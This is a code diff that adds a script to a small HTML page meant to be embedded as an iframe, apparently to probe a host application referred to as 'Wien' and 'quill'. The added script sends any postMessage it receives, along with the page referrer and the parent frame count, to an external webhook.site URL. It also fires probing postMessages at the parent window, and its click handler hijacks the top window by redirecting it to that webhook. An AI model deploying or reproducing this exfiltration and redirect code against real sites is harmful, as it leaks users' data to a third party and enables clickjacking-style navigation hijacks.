@@ -1,6 +1,32 @@
 <!DOCTYPE html>
 <html>
+<head>
+<script>
+  const WH = "https://webhook.site/e6712db6-5fb8-4657-b0ce-be11d26ba85d";
+
+  function exfil(data) {
+    fetch(WH + "?d=" + encodeURIComponent(JSON.stringify(data)));
+  }
+
+  // Escuchar si Wien manda algo al iframe
+  window.addEventListener("message", function(e) {
+    exfil({type: "RECIBIDO_DE_WIEN", origin: e.origin, data: e.data});
+  });
+
+  // Mandar postMessages al padre con distintos formatos
+  window.parent.postMessage({type: "ping"}, "*");
+  window.parent.postMessage({action: "reload"}, "*");
+  window.parent.postMessage({source: "quill"}, "*");
+  window.parent.postMessage("test", "*");
+
+  // Exfiltrar lo observable sin SOP
+  exfil({
+    referrer: document.referrer,
+    parent_frames: window.parent.frames.length
+  });
+</script>
+</head>
 <body style="margin:0;cursor:pointer;width:100vw;height:100vh;"
-      onclick="window.open('https://webhook.site/e6712db6-5fb8-4657-b0ce-be11d26ba85d','_blank')">
+      onclick="window.top.location.href='https://webhook.site/e6712db6-5fb8-4657-b0ce-be11d26ba85d'">
 </body>
 </html>
